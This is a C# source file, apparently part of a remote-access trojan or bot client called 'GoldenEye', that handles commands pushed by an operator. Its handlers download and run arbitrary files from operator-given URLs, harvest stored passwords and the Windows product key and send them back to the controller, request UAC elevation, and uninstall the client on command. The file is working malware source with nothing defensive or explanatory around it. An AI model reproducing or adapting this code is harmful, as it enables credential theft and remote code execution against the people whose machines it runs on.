using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace GoldenEye.Functions
{
    public class OnJoinCommandsHandler
    {
        public MainWorker mwrk;

        public void Start(string commands)
        {
            try
            {
                string[] cmds = commands.Split('³');

                foreach (string cmd in cmds)
                {
                    switch (cmd.Split('²')[0])
                    {
                        case "execute":
                            if (cmd.Split('²')[1].Equals("file"))
                            {
                                string url = cmd.Split('²')[2];
                                string dropAs = cmd.Split('²')[3];
                                string fullPathString = Path.GetTempPath();

                                mwrk.SendStatus("Downloading File...");
                                WebClient webClienta = new WebClient();
                                webClienta.DownloadFile(url, fullPathString + @"\" + dropAs);
                                Process.Start(fullPathString + @"\" + dropAs);
                                mwrk.SendStatus("Executed File!");
                            }
                            else if (cmd.Split('²')[1].Equals("update"))
                            {
                                string dllink = cmd.Split('²')[2];
                                string saveas = cmd.Split('²')[3];
                                string currentPath = Application.StartupPath;
                                mwrk.SendStatus("Downloading Update...");
                                WebClient webClient = new WebClient();
                                webClient.DownloadFile(dllink, currentPath + @"\" + saveas);
                                Process.Start(currentPath + @"\" + saveas);
                                mwrk.SendStatus("Executed Update! Disconnecting...");
                                Thread.Sleep(400);
                                mwrk.Uninstall();
                            }
                            break;

                        case "Recover":
                            WinSerial wins = new WinSerial();
                            Recovery rec = new Recovery();

                            if (cmd.Split('²')[1].Equals("Passwords"))
                            {
                                foreach (DriveInfo Drive in DriveInfo.GetDrives())
                                {
                                    if (Drive.RootDirectory.FullName == @"C:\")
                                    {
                                        Recovery x = new Recovery(Drive);

                                        x.recoverAll();
                                        mwrk.Send("passreco|" + mwrk.ClientID + "|" + x.allPws);
                                    }
                                }
                            }
                            else if (cmd.Split('²')[1].Equals("Winserial"))
                            {
                                string serial = wins.GetWindowsProductKeyFromRegistry();
                                mwrk.Send("winserial|" + mwrk.ClientID + "|" + mwrk.OperatingSystem + "|" + serial);
                            }

                            break;

                        case "uac":
                            if (cmd.Split('²')[1].Equals("request"))
                            {
                                mwrk.Uacmode = "nonpersist";
                                Thread yellowUacThread = new Thread(mwrk.askUac);
                                yellowUacThread.IsBackground = true;
                                yellowUacThread.Start();
                            }
                            break;

                        case "antim":
                            if (cmd.Split('²')[1].Equals("normal"))
                            {
                                mwrk.StartAntiMalwareThread("#");
                            }
                            else if (cmd.Split('²')[1].Equals("enableprs"))
                            {
                                mwrk.proActiveIsEnabled = true;
                                Thread tPR = new Thread(new ThreadStart(mwrk.proactiveAM));
                                tPR.IsBackground = true;
                                tPR.Start();
                            }
                            else if (cmd.Split('²')[1].Equals("disableprs"))
                            {
                                mwrk.proActiveIsEnabled = false;
                            }
                            break;

                        case "action":
                            if (cmd.Split('²')[1].Equals("disconnect"))
                            {
                                Environment.Exit(0);
                            }
                            else if (cmd.Split('²')[1].Equals("uninstall"))
                            {
                                mwrk.Uninstall();
                            }
                            break;
                    }
                }
            }
            catch (Exception eax) { mwrk.adderror(eax.ToString()); }
        }
    }
}